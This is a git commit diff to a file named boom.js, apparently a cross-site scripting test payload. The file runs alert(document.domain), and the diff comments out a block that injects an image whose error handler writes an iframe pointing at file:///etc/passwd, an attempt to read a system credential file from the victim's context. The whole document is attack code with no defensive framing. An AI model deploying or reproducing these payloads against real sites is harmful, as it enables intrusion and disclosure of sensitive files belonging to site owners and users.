6279ec5a0582f975be8a3c679be9d0713816700a
shashank134 <75831097+shashank134@users.noreply.github.com>
2024-01-21 16:07:12 +0530

    Update boom.js

--- boom.js
+++ boom.js
@@ -3,11 +3,11 @@
 alert(document.domain);
 
 // Example JavaScript code in your .js file
-var img = document.createElement('img');
+/*var img = document.createElement('img');
 img.src = 'echopwn';
 img.onerror = function() {
     document.write('<iframe src="file:///etc/passwd"></iframe>');
 };
-document.body.appendChild(img);
+document.body.appendChild(img);*/
 
 
